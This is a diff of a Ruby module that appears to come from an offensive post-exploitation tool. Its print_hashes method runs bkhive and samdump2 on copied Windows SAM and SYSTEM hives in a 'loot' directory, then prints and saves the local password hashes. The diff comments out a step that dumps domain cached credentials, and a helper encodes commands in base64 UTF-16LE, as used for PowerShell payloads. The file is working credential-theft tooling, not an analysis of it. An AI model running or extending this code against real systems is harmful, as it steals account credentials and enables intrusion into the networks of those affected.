@@ -72,29 +72,29 @@ module MainCommands
     'c:\\windows\\temp\\test.txt'
   end
   def print_hashes(x)
-    cache_path, cache_status = Open3.capture2('which cachedump')
+    #cache_path, cache_status = Open3.capture2('which cachedump')
     samdump_path, samdump_status = Open3.capture2('which samdump2')
     bkhive_path, bkhive_status = Open3.capture2('which bkhive')
-    print_error("Can't find cachedump!\n") if cache_status.to_s =~ /1/
-    print_error("Can't find samdump2!\n") if samdump_status.to_s =~ /1/
-    print_error("Can't find bkhive!\n") if bkhive_status.to_s =~ /1/
-    if samdump_status.to_s =~ /0/ and bkhive_status.to_s =~ /0/
-      Open3.capture2("#{bkhive_path} #{loot_dir}sys#{x} #{loot_dir}sys_key#{x}.txt")
-      sam_dump = Open3.capture2("#{samdump_path} #{loot_dir}sam#{x} #{loot_dir}sys_key#{x}.txt")
+    #print_error("Can't find cachedump!\n") if cache_status.to_s =~ /exit 1/
+    print_error("Can't find samdump2!\n") if samdump_status.to_s =~ /exit 1/
+    print_error("Can't find bkhive!\n") if bkhive_status.to_s =~ /exit 1/
+    if samdump_status.to_s =~ /exit 0/ and bkhive_status.to_s =~ /exit 0/
+      Open3.capture2("#{bkhive_path.chomp} #{loot_dir}sys#{x} #{loot_dir}sys_key#{x}.txt")
+      sam_dump,sam_exit = Open3.capture2("#{samdump_path.chomp} #{loot_dir}sam#{x} #{loot_dir}sys_key#{x}.txt")
       print_success("Printing Hashes!\n")
       puts sam_dump
       File.open("#{loot_dir}hashes#{x}.txt",'w') {|f| f.write(sam_dump)}
     else
       print_error("Can't dump local hashes!\n")
     end
-    if cache_status =~ /0/
-      cache_domain = Open3.capture2("#{cache_path} #{loot_dir}sys#{x} #{loot_dir}sec#{x}")
-      print_success("Printing Domain Chached Creds!\n")
-      puts cache_domain
-      File.open("#{loot_dir}domain_hashes#{x}.txt",'w') {|f| f.write(cache_domain)}
-    else
-      print_error("Can't Dump Domain Cached Creds!\n")
-    end
+    #if cache_status =~ /exit 0/
+    #  cache_domain = Open3.capture2("#{cache_path.chomp} #{loot_dir}sys#{x} #{loot_dir}sec#{x}")
+    #  print_success("Printing Domain Chached Creds!\n")
+    #  puts cache_domain
+    #  File.open("#{loot_dir}domain_hashes#{x}.txt",'w') {|f| f.write(cache_domain)}
+    #else
+    #  print_error("Can't Dump Domain Cached Creds!\n")
+    #end
   end
   def encode_command(command)
     Base64.encode64(command.encode('utf-16le')).delete("\r\n")
